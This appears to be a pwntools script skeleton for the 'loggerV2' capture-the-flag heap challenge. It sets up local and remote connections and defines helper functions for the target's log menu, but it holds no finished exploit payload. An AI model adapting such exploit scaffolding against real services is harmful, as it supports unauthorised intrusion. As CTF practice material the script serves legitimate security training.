from pwn import *
elf = ELF('./loggerV2', checksec=False)
libc = ELF('/opt/glibc/x64/2.31/lib/libc.so.6', checksec=False)

p = elf.process()
#p = remote('ctf.joints.id', 17078)
def add_log(idx, sz):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', b'%d' % sz)
    p.sendlineafter(b': ', b'%s' % idx)

def overwrite_log(idx, sz, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', b'%s' % idx)
    p.sendlineafter(b': ', b'%d' % sz)
    p.sendafter(b'content\n', b'%s' % data)

def save_log(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', b'%s' % idx)

def read_log(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b': ', b'%s' % idx)
    return p.recvlines(2)[-1]

def remove_log(idx):
    p.sendlineafter(b'>', b'5')
    p.sendlineafter(b': ', b'%s' % idx)

add_log(b'A', 24)
overwrite_log(b'A', 24, b'AAA')
save_log(b'A')
read_log(b'A')
p.interactive() 